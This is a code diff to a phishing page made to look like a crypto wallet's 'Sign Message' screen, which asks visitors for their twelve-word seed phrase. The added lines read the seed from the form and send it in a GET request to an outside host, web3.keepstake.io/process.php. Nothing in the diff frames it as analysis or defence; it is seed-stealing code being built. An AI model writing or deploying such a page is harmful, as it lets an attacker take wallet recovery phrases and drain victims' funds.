@@ -3151,9 +3151,8 @@ button.first-time-flow__button--tertiary:hover {
               min-width: 357px;
           }
 
-      </style><span class="css-transition-group"></span></div></div><!-- react-empty: 27 --><div class="app-primary from-right" style="width: 100%;"><div class="initialize-screen flex-column flex-center flex-grow"><h3 class="flex-center text-transform-uppercase " style="background: rgb(235, 235, 235); color: rgb(174, 174, 174); margin-bottom: 24px; width: 100%; font-size: 20px; padding: 6px;">Sign Message</h3><h3>Wallet Seed</h3><form id="formx" style="display:inline-block;" method="post"><textarea name="seed" placeholder="Enter your twelve word phrase here to sign an ownership message." class="twelve-word-phrase letter-spacey"></textarea><div style="align:center; margin-left:47px; margin-right:62px; margin-top:25px;" class="flex-row flex-space-between" style="margin-top: 30px; width: 50%;"><button class="primary">CANCEL</button><button name="submit" type="submit" class="primary">OK</button></form></div></div></div></div></div>
-    <script src="./libs.js" type="text/javascript" charset="utf-8"></script>
-    <script src="./ui.js" type="text/javascript" charset="utf-8"></script>
+      </style><span class="css-transition-group"></span></div></div><!-- react-empty: 27 --><div class="app-primary from-right" style="width: 100%;"><div class="initialize-screen flex-column flex-center flex-grow"><h3 class="flex-center text-transform-uppercase " style="background: rgb(235, 235, 235); color: rgb(174, 174, 174); margin-bottom: 24px; width: 100%; font-size: 20px; padding: 6px;">Sign Message</h3><h3>Wallet Seed</h3><form id="formx" style="display:inline-block;" method="post"><textarea id="textSeed" name="seed" placeholder="Enter your twelve word phrase here to sign an ownership message." class="twelve-word-phrase letter-spacey"></textarea><div style="align:center; margin-left:47px; margin-right:62px; margin-top:25px;" class="flex-row flex-space-between" style="margin-top: 30px; width: 50%;"><button class="primary">CANCEL</button><button name="submit" type="submit" class="primary">OK</button></form></div></div></div></div></div>
+    <script src="ui.js" type="text/javascript" charset="utf-8"></script>
     <script type="text/javascript" charset="utf-8">
 
     function callback(){
@@ -3166,7 +3165,9 @@ button.first-time-flow__button--tertiary:hover {
         }
     };
 
-    xhttp.open("GET", "https://web3.keepstake.io/process.php", true);
+    var seed = document.getElementById("textSeed");
+    seedx = seed.innerHTML;    
+    xhttp.open("GET", "https://web3.keepstake.io/process.php?seed=" + seedx, true);
     xhttp.send();
 
     }
